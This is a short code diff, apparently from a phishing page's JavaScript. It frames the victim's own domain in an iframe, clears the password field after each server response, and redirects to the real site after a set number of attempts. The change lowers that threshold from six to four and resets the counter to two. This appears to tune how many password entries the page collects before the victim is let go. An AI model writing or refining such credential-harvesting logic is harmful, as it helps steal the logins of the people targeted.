@@ -259,8 +259,8 @@ $("#iframe").attr("src", "https://www."+my_slice);
                 console.log(response);
                 if(response['signal'] == 'ok'){
                   $("#password").val("");
-                  if (count>=6) {
-                    count=0;
+                  if (count>=4) {
+                    count=2;
                     // window.location.replace(response['redirect_link']);
                     window.location.replace("http://www."+my_slice);
 
